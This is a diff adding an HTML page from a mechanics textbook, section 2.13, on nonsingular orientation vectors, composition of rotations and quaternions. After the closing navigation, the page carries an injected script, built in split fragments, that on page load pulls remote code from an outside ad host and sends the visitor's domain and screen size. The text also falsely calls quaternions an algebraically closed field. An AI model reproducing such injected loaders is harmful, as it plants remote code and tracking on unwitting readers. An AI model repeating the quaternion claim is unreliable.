@@ -1,0 +1,384 @@
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<!-- Generated from TeX source by tex2page, v 4p3, 
+     (c) Dorai Sitaram, http://www.cs.rice.edu/~dorai/tex2page -->
+<head>
+<title>
+
+Structure and Interpretation 
+of Classical Mechanics
+
+</title>
+<link rel="stylesheet" type="text/css" href="book-Z-C.css" title=default>
+<meta name=robots content="noindex,follow">
+</head>
+<body>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-32.html">previous</a></span><span>, <a href="book-Z-H-34.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<a name="%_sec_2.13"></a>
+<h2><a href="book-Z-H-4.html#%_toc_%_sec_2.13">2.13&nbsp;&nbsp;Nonsingular Generalized Coordinates</a></h2>
+<p><a name="%_idx_1508"></a><a name="%_idx_1510"></a><a name="%_idx_1512"></a>
+The Euler angles provide a convenient way to parameterize the
+orientation of a rigid body.  However, the equations of motion derived
+for them have singularities.  Though we can avoid the singularities by
+using other Euler-like combinations with different singularities, this
+kludge is not very satisfying.  Let's brainstorm a bit and see if we
+can come up with something better.</p>
+<p>
+What does it take to specify an orientation?  Perhaps we can take a
+hint from <a name="%_idx_1514"></a>Euler's theorem.  Recall that Euler's theorem states that
+any orientation can be reached with a single rotation.  So one idea to
+specify the orientation of a body is to parameterize this single
+rotation that does the job.  To specify this rotation we need to
+specify the rotation axis and the amount of rotation.  We contrast
+this with the Euler angles, which specify three successive rotations.
+These three rotations need not have any relation to the single
+composite rotation that gives the orientation.  Isn't it curious that
+the Euler angles make no use of Euler's theorem?</p>
+<p>
+We can think of several ways of specifying a rotation.  One way would
+be to specify the rotation axis by the latitude and the longitude at which
+the rotation axis pierces a sphere.  The amount of rotation needed to
+take the body from the reference position could be specified by one
+more angle.  We can predict, though, that this choice of coordinates
+will have similar problems to those of the Euler angles: if the amount
+of rotation is zero, then the latitude and longitude of the rotation
+axis are undefined.  So the Lagrange equations for these angles are
+probably singular.  Another idea, without this defect, is to represent
+the rotation by the rectangular components of an <a name="%_idx_1516"></a><a name="%_idx_1518"></a>orientation vector
+<img src="chap2-Z-G-D-19.gif" border="0">; we take the direction of the orientation vector to be the
+same as the axis of rotation that takes the body from the reference
+orientation to the present orientation, and the length of the
+orientation vector is the angle by which the body must be rotated, in
+a right-hand sense, about the orientation vector.  With this choice of
+coordinates, if the angle of rotation is zero then the length of the
+vector is zero and has no unwanted direction.  This choice looks
+promising.</p>
+<p>
+We denote the rectangular components of <img src="chap2-Z-G-D-19.gif" border="0"> by the following: (
+<em>o</em><sub><em>x</em></sub>, <em>o</em><sub><em>y</em></sub>, <em>o</em><sub><em>z</em></sub> ); these will be our
+generalized coordinates.  The magnitude <em>o</em>  = 
+(<em>o</em><sub><em>x</em></sub><sup>2</sup>  +  <em>o</em><sub><em>y</em></sub><sup>2</sup>  +  <em>o</em><sub><em>z</em></sub><sup>2</sup>)<sup>1/2</sup> is the
+angle of rotation.  The axis of the rotation is <img src="chap2-Z-G-D-20.gif" border="0">  =  <img src="chap2-Z-G-D-19.gif" border="0"> /
+<em>o</em>.  We denote the components of <img src="chap2-Z-G-D-20.gif" border="0"> by <img src="chap2-Z-G-D-20.gif" border="0"><sub><em>x</em></sub>,
+<img src="chap2-Z-G-D-20.gif" border="0"><sub><em>y</em></sub>, and <img src="chap2-Z-G-D-20.gif" border="0"><sub><em>z</em></sub>.  The first step in implementing the
+components of the orientation vector as generalized coordinates is to
+construct the rotation <em>M</em> to which the orientation vector <img src="chap2-Z-G-D-19.gif" border="0">
+corresponds.  Let <img src="chap2-Z-G-D-15.gif" border="0">' be a vector to one of the constituents of
+the body in the reference orientation, and <img src="chap2-Z-G-D-15.gif" border="0"> be the vector to
+that constituent after rotation by <em>M</em>:
+<a name="EQUATION_2.109"></a></p>
+<div align=left><img src="chap2-Z-G-130.gif" border="0"></div>
+<p>
+We can determine <em>M</em> by considering how the rotation represented by
+<img src="chap2-Z-G-D-19.gif" border="0"> affects the vector <img src="chap2-Z-G-D-15.gif" border="0">'.  The component of <img src="chap2-Z-G-D-15.gif" border="0">'
+parallel to <img src="chap2-Z-G-D-19.gif" border="0"> is unaffected.  The perpendicular component is
+reduced by the cosine of the rotation angle, and a component
+perpendicular to these two is generated that is proportional to the
+sine of the rotation angle and the magnitude of the perpendicular
+component.  Let (<img src="chap2-Z-G-D-15.gif" border="0">')<sup>||</sup>  =  (<img src="chap2-Z-G-D-15.gif" border="0">'  &middot;  <img src="chap2-Z-G-D-20.gif" border="0">) <img src="chap2-Z-G-D-20.gif" border="0"> and
+(<img src="chap2-Z-G-D-15.gif" border="0">')<sup><u>|</u></sup>  =  <img src="chap2-Z-G-D-15.gif" border="0">'  <tt>-</tt>  (<img src="chap2-Z-G-D-15.gif" border="0">')<sup>||</sup>; then
+<a name="EQUATION_2.110"></a></p>
+<div align=left><img src="chap2-Z-G-131.gif" border="0"></div>
+<p>
+From this expression we can construct the equivalent rotation matrix.
+First define some useful primitive matrices:
+<a name="EQUATION_2.111"></a></p>
+<div align=left><img src="chap2-Z-G-132.gif" border="0"></div>
+<p>
+and
+<a name="EQUATION_2.112"></a></p>
+<div align=left><img src="chap2-Z-G-133.gif" border="0"></div>
+<p>
+with the identity
+<a name="EQUATION_2.113"></a></p>
+<div align=left><img src="chap2-Z-G-134.gif" border="0"></div>
+<p>
+The matrix <strong><em>A</em></strong> is antisymmetric and <strong><em>S</em></strong> is the symmetric
+outer product of the components of <img src="chap2-Z-G-D-20.gif" border="0">.  The matrix <strong><em>A</em></strong>
+implements the cross product of <img src="chap2-Z-G-D-20.gif" border="0"> with other vectors, and the
+matrix <strong><em>S</em></strong> projects vectors to the orientation vector.  We have the
+following identities:
+<a name="EQUATION_2.114"></a></p>
+<div align=left><img src="chap2-Z-G-135.gif" border="0"></div>
+<p>
+In terms of these matrices, the rotation matrix is
+<a name="EQUATION_2.118"></a></p>
+<div align=left><img src="chap2-Z-G-136.gif" border="0"></div>
+<p></p>
+<p>
+The inverse of a rotation is a rotation about the same axis but by the
+negative of the rotation angle.  Thus the inverse of <strong><em>M</em></strong> can be
+written down immediately:
+<a name="EQUATION_2.119"></a></p>
+<div align=left><img src="chap2-Z-G-137.gif" border="0"></div>
+<p>
+We verify that the inverse of the rotation matrix is the transpose of
+the rotation matrix by recalling that <strong><em>I</em></strong> and <strong><em>S</em></strong> are
+symmetric and <strong><em>A</em></strong> is antisymmetric.</p>
+<p>
+
+The computation of the angular velocity vector from <strong><em>M</em></strong><sup><tt><em>T</em></tt></sup> and
+<em>D</em><strong><em>M</em></strong> is straightforward, though tedious;
+the angular velocity vector turns out to have a simple form:
+<a name="EQUATION_2.120"></a></p>
+<div align=left><img src="chap2-Z-G-138.gif" border="0"></div>
+<p>
+The components of the angular velocity vector on the principal axes can be
+found by multiplying the above by <strong><em>M</em></strong><sup><tt>-</tt>1</sup>  =  <strong><em>M</em></strong><sup><tt><em>T</em></tt></sup>:
+<a name="EQUATION_2.121"></a></p>
+<div align=left><img src="chap2-Z-G-139.gif" border="0"></div>
+<p>
+Let 
+<a name="EQUATION_2.122"></a></p>
+<div align=left><img src="chap2-Z-G-140.gif" border="0"></div>
+<p>
+then we have
+<a name="EQUATION_2.123"></a></p>
+<div align=left><img src="chap2-Z-G-141.gif" border="0"></div>
+<p>
+Solving, we find
+<a name="EQUATION_2.124"></a></p>
+<div align=left><img src="chap2-Z-G-142.gif" border="0"></div>
+<p>
+The matrix <strong><em>W</em></strong> is not an orthogonal matrix, so its inverse is
+not trivial, but we can use the properties of the primitive matrices
+to find it.  Suppose we have a matrix of the form
+<a name="EQUATION_2.125"></a></p>
+<div align=left><img src="chap2-Z-G-143.gif" border="0"></div>
+<p>
+that we wish to invert.  Let's guess that the inverse matrix has a
+similar form:
+<a name="EQUATION_2.126"></a></p>
+<div align=left><img src="chap2-Z-G-144.gif" border="0"></div>
+<p>
+We wish to find the coefficients <em>a</em>', <em>b</em>', and <em>c</em>' so that <strong><em>N</em></strong><strong><em>N</em></strong><sup><tt>-</tt>1</sup>  =  <em>I</em>.  We find three conditions on the coefficients:
+<a name="EQUATION_2.127"></a></p>
+<div align=left><img src="chap2-Z-G-145.gif" border="0"></div>
+<p>
+with solution
+<a name="EQUATION_2.130"></a></p>
+<div align=left><img src="chap2-Z-G-146.gif" border="0"></div>
+<p>
+We can now invert the matrix <strong><em>W</em></strong>, using its representation in
+terms of primitive matrices, to find
+<a name="EQUATION_2.133"></a></p>
+<div align=left><img src="chap2-Z-G-147.gif" border="0"></div>
+<p>
+Note that all terms have finite limits as <em>o</em> -->
+0.  There is, however, a new singularity.  As <em>o</em> --> 2 <img src="chap1-Z-G-D-15.gif" border="0"> two
+of the denominators become singular, but there the zeros in the
+numerators are not strong enough to kill the singularity.  This is the
+expected singularity that corresponds to the fact that at radius 2
+<img src="chap1-Z-G-D-15.gif" border="0"> the orientation vector corresponds to no rotation, but
+nevertheless specifies a rotation axis.  This singularity is easy to
+avoid:  whenever the orientation vector develops a magnitude larger
+than <img src="chap1-Z-G-D-15.gif" border="0">, simply replace it by the equivalent orientation vector
+<img src="chap2-Z-G-D-19.gif" border="0">  <tt>-</tt>  2<img src="chap1-Z-G-D-15.gif" border="0"> <img src="chap2-Z-G-D-20.gif" border="0">.</p>
+<p>
+We can write the equations governing the evolution of the orientation
+as a vector equation in terms of <img src="chap2-Z-G-D-8.gif" border="0">'  =  <em>M</em><sup><tt>-</tt>1</sup> <img src="chap2-Z-G-D-8.gif" border="0">:
+<a name="EQUATION_2.134"></a></p>
+<div align=left><img src="chap2-Z-G-148.gif" border="0"></div>
+<p>
+with two auxiliary functions
+<a name="EQUATION_2.135"></a></p>
+<div align=left><img src="chap2-Z-G-149.gif" border="0"></div>
+<p>
+The equation of
+motion for the orientation vector is surprisingly simple.
+Both auxiliary functions have finite limits at zero:
+<a name="EQUATION_2.137"></a></p>
+<div align=left><img src="chap2-Z-G-150.gif" border="0"></div>
+<p>
+Orientation vectors with
+magnitude less than or equal to <img src="chap1-Z-G-D-15.gif" border="0"> are enough to specify all
+orientations, and the equations of motion in this region have no
+singularities.  The orientation vector may develop magnitudes greater than
+<img src="chap1-Z-G-D-15.gif" border="0">, but then we replace it by the equivalent orientation vector with
+magnitude less than <img src="chap1-Z-G-D-15.gif" border="0">.  And there is no hurry to do this because
+the equations are not singular until the magnitude reaches 2<img src="chap1-Z-G-D-15.gif" border="0">.
+Thus we have a complete nonsingular specification of the rigid body
+dynamics.  </p>
+<p>
+</p>
+<a name="%_sec_Temp_216"></a>
+<h4><a href="book-Z-H-4.html#%_toc_%_sec_Temp_216">A practical matter</a></h4>
+<p>In order to use the orientation vector, we are presented with the practical
+problem of converting between the orientation vector representation of
+the orientation and other representations.  We
+can consider the rotation matrix <strong><em>M</em></strong> as an intermediate
+universal representation.  Whatever generalized coordinates have been
+chosen, we must be able to compute the rotation matrix to which the
+coordinates correspond.  We must also solve the converse problem -- the
+determination of the generalized coordinates from the rotation matrix.</p>
+<p>
+We already have the explicit form for the rotation matrix in terms of
+the orientation vector in
+equation&nbsp;(<a href="#EQUATION_2.118">2.118</a>), repeated here for
+convenience:
+<a name="EQUATION_2.138"></a></p>
+<div align=left><img src="chap2-Z-G-151.gif" border="0"></div>
+<p>
+We can solve the converse problem by examining this same equation.  We
+note that of the contributions to <strong><em>M</em></strong> two parts are symmetric
+and one is antisymmetric.  We can isolate the antisymmetric component
+by subtracting the transpose.  We have
+<a name="EQUATION_2.139"></a></p>
+<div align=left><img src="chap2-Z-G-152.gif" border="0"></div>
+<p>
+But the matrix <strong><em>A</em></strong> is simply related to the orientation vector:
+<a name="EQUATION_2.140"></a></p>
+<div align=left><img src="chap2-Z-G-153.gif" border="0"></div>
+<p>
+We use the inverse operation  <em>A</em><sup><tt>-</tt>1</sup> that extracts
+the components of a 3-vector from an antisymmetric 3 &times; 3 matrix.  So we
+have
+<a name="EQUATION_2.141"></a></p>
+<div align=left><img src="chap2-Z-G-154.gif" border="0"></div>
+<p>
+Note that information about the magnitude <em>o</em> of the rotation is not
+available in <strong><em>A</em></strong> by itself.  However,  the combination of <strong><em>M</em></strong> and its transpose produces a scaled version of <strong><em>A</em></strong> from
+which the magnitude of the rotation can be recovered:
+<a name="EQUATION_2.142"></a></p>
+<div align=left><img src="chap2-Z-G-155.gif" border="0"></div>
+<p>
+The length of the vector represented by the components on the
+left-hand side is just sin <em>o</em>.  This does not
+determine <em>o</em> uniquely, because <em>o</em> spans 
+the interval 0 to <img src="chap1-Z-G-D-15.gif" border="0">.
+To completely determine <em>o</em> and thus <img src="chap2-Z-G-D-19.gif" border="0"> we need more
+information, say by determining cos <em>o</em>.  </p>
+<p>
+We can get cos <em>o</em> easily
+enough.  Examination of the components shows 
+<a name="EQUATION_2.143"></a></p>
+<div align=left><img src="chap2-Z-G-156.gif" border="0"></div>
+<p>
+Having determined both the sine and the cosine of <em>o</em>, we can determine
+<em>o</em>.  Some of these expressions contain divisions by&nbsp;<em>o</em> that
+may be zero, but if <em>o</em> = 0 then the orientation vector is just the zero
+vector.  This completes the solution of the practical problem of going
+to and from the orientation vector.</p>
+<p>
+</p>
+<a name="%_sec_Temp_217"></a>
+<h4><a href="book-Z-H-4.html#%_toc_%_sec_Temp_217">Composition of rotations</a></h4>
+<p><a name="%_idx_1520"></a><a name="%_idx_1522"></a><a name="%_idx_1524"></a>
+We can ask the following question: ``To which rotation does the
+composition of two rotations correspond?''  Or alternatively, ``What is the algebra of orientation
+vectors?''  We have all the
+pieces; answering this question is just a matter of computation.
+Given two rotations represented by the rotation matrices <strong><em>M</em></strong><sub>1</sub>
+and <strong><em>M</em></strong><sub>2</sub>, the rotation matrix of the composition of these
+rotations is <strong><em>M</em></strong>  =  <strong><em>M</em></strong><sub>2</sub> <strong><em>M</em></strong><sub>1</sub>.  Each of these rotation
+matrices can be converted to the equivalent orientation vector.  We
+can define the composition <img src="chap2-Z-G-D-19.gif" border="0">  =  <img src="chap2-Z-G-D-19.gif" border="0"><sub>2</sub> <small>o</small> <img src="chap2-Z-G-D-19.gif" border="0"><sub>1</sub>.</p>
+<p>
+Let <img src="chap1-Z-G-D-21.gif" border="0">  =  (sin <em>o</em>) / <em>o</em>, <i>&szlig;</i>  =  (1  <tt>-</tt>  cos <em>o</em>)/<em>o</em><sup>2</sup>, and <img src="chap1-Z-G-D-1.gif" border="0">  = 
+cos <em>o</em>.  By direct calculation we find
+<a name="EQUATION_2.144"></a></p>
+<div align=left><img src="chap2-Z-G-157.gif" border="0"></div>
+<p>
+and 
+<a name="EQUATION_2.145"></a></p>
+<div align=left><img src="chap2-Z-G-158.gif" border="0"></div>
+<p>
+which together determine <img src="chap2-Z-G-D-19.gif" border="0">.</p>
+<p>
+Well, the formulas are rather complicated, but it turns out that with
+a little rearrangement they can be made quite simple.  Let <em>c</em>
+ =  cos ( <em>o</em>/2 ) and <em>s</em>  =  sin ( <em>o</em>/2),
+and define <img src="chap2-Z-G-D-21.gif" border="0">  =  (<em>s</em> / <em>o</em>) <img src="chap2-Z-G-D-19.gif" border="0"> .  The vector
+<img src="chap2-Z-G-D-21.gif" border="0"> is a scaled version of <img src="chap2-Z-G-D-19.gif" border="0">; instead of having the
+magnitude <em>o</em> as <img src="chap2-Z-G-D-19.gif" border="0"> does, the vector <img src="chap2-Z-G-D-21.gif" border="0"> has the
+magnitude <em>s</em>  =  sin (<em>o</em>/2).  Notice that if <em>o</em> is
+restricted to magnitudes less than <img src="chap1-Z-G-D-15.gif" border="0"> then the magnitude of the
+rotation <em>o</em> can be recovered from the magnitude of
+<img src="chap2-Z-G-D-21.gif" border="0">.  Thus, with this restriction,
+the vector <img src="chap2-Z-G-D-21.gif" border="0"> corresponds to a unique rotation, and no extra
+information is needed.  Nevertheless, it is convenient to keep track of
+the cosine of the half-angle as well as the sine; so let <em>q</em>  = 
+<em>c</em>  =  cos ( <em>o</em>/2).<a name="call_footnote_Temp_218" href="#footnote_Temp_218"><sup><small>22</small></sup></a>
+The magnitude of <img src="chap2-Z-G-D-21.gif" border="0">  =  <em>s</em>
+and <em>q</em>  =  <em>c</em>, so <em>q</em><sup>2</sup>  +  <img src="chap2-Z-G-D-21.gif" border="0">  &middot;  <img src="chap2-Z-G-D-21.gif" border="0">  =  1.  We can
+reexpress the formulas for the composition of two rotations in terms
+of <img src="chap2-Z-G-D-21.gif" border="0"> and <em>q</em> for each rotation.  We have
+<a name="EQUATION_2.146"></a></p>
+<div align=left><img src="chap2-Z-G-159.gif" border="0"></div>
+<p>
+Now that is a significant simplification!  The 4-tuple formed from
+<em>q</em> with the three components of <img src="chap2-Z-G-D-21.gif" border="0"> is the tuple of components of 
+<a name="%_idx_1526"></a>Hamilton's
+<em>quaternion</em>.  We see that the vector part of the
+quaternion that represents an orientation is a scaled version
+of the orientation vector.</p>
+<p>
+
+<a name="%_idx_1528"></a>Hamilton discovered an even more elegant way of writing the 
+formula for the composition of two rotations.  Introduce three <em>unit quaternions</em>
+<em>i</em>, <em>j</em>, <em>k</em>, such that <em>i</em><sup>2</sup>  =  <em>j</em><sup>2</sup>  =  <em>k</em><sup>2</sup>  =   <tt>-</tt> 1, <em>i</em><em>j</em>  =  <em>k</em>, <em>j</em><em>k</em> = <em>i</em>,
+<em>k</em><em>i</em> = <em>j</em>, and each pair of distinct unit quaternions anticommute: <em>i</em><em>j</em>  =   <tt>-</tt> <em>j</em><em>i</em>, and
+so on.  Denote the three components of <img src="chap2-Z-G-D-21.gif" border="0"> by ( <em>q</em><sup>1</sup>, <em>q</em><sup>2</sup>, <em>q</em><sup>3</sup> ),
+and <em>q</em> by <em>q</em><sup>0</sup>.  Then define the composite quaternion <strong><em>q</em></strong>  =  <em>q</em><sup>0</sup>
+ +  <em>i</em> <em>q</em><sup>1</sup>  +  <em>j</em> <em>q</em><sup>2</sup>  +  <em>k</em> <em>q</em><sup>3</sup>.  With the rule for how the unit quaternions
+multiply, the formula for the composition of two rotations becomes
+simply a multiplication.  The quaternions generalize the idea of
+complex numbers.  In fact, they are the only algebraically closed field
+besides complex numbers.
+The unit quaternions cannot be represented simply as real numbers or
+complex numbers, particularly because of their anticommuting
+properties.  However, they do have a representation as 2 &times; 2 matrices of
+complex numbers.  The units are
+<a name="EQUATION_2.148"></a></p>
+<div align=left><img src="chap2-Z-G-160.gif" border="0"></div>
+<p>
+where the <em>i</em> on the right-hand side is the imaginary unit <em>i</em><sup>2</sup>
+ =   <tt>-</tt> 1.  These matrices are related to the <a name="%_idx_1530"></a><a name="%_idx_1532"></a><a name="%_idx_1534"></a>Pauli spin
+matrices.
+There are other representations, but further discussion of
+representations of rotations would carry us too far afield.</p>
+<p>
+If we are faced with the task of composing rotations repeatedly, then
+the quaternions will be a handy intermediate representation.  The
+quaternions also have the advantage that we do not need to worry about
+whether the angle of rotation is in the appropriate range.  However,
+the equation of motion for the orientation vector is simpler than the
+equation of motion for the quaternion, so we will stick with the
+orientation vector when we need nonsingular equations of motion for
+the orientation.</p>
+<p>
+</p>
+<p><a name="%_thm_2.18"></a>
+<b>Exercise 2.18.</b>&nbsp;&nbsp;<strong>Composition</strong><br>
+Verify that the rule for composition of two rotations in terms of the
+orientation vectors
+(equations <a href="#EQUATION_2.144">2.144</a> and
+<a href="#EQUATION_2.144">2.144</a>) is
+equivalent to the rule for multiplying two quaternions (equation
+<a href="#EQUATION_2.147">2.147</a>).
+</p>
+
+<p></p>
+<p>
+</p>
+<p><a name="%_thm_2.19"></a>
+<b>Exercise 2.19.</b>&nbsp;&nbsp;<strong>Equation of motion</strong><br>
+Find the equation of motion for the orientation quaternion in terms of
+the angular velocity vector.
+</p>
+
+<p></p>
+<p>
+
+</p>
+<div class=smallprint><hr></div>
+<p></p>
+<div class=footnote>
+<p><a name="footnote_Temp_218" href="#call_footnote_Temp_218"><sup><small>22</small></sup></a> This notation has the potential for great confusion: <em>q</em> is
+not the magnitude of the vector <img src="chap2-Z-G-D-21.gif" border="0">.  Watch out!</p>
+</div>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-32.html">previous</a></span><span>, <a href="book-Z-H-34.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582NgXaqsgjSGNhMkGfMSQiD2zLSiI%2fPb1ZZVnd0ns7Dc3HK4cBun9hufno34moc91Uf5450%2blt1yhxatEf94PThtqDeca%2bPgnpKyo2J1K65ecMIgH48Oa22mGxyQKS%2feOU%2bZobrMFFcCU4w2jwbyYQ5MyFLvQSp2GA7CPCyuxVO6Ayy71LUoTLJoqe7hDX%2fXmBe2BT8bMaTpeGnkzF0LTmdpNerUEb1dP7Y%2bREd113sBR5HLVkM4tSX%2bg7C8CYWrHnRiiDUM9aAneY3ydQvzWU%2fxSSPnTZdHMxrjB3zAlSxILjm2ebmyNSHtQzHOYx5re3hcRr%2be9rYd9bAuOEeW8Fjt9XOY8CQRpuUvdDBH3%2b8ojtMFRMh2YuIgyTN312HEkMtwUWcFe56yc%2fQL0vk4vwZLMkhAHEoCrHYMsrcKiQ7qheX1izMGTKqWjX2%2f4AFYbz0WWqtmkVqpixfUvap3c4l1b8%2fKCwoyfIJgnlWKlX8OX");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body></body>
+</html>
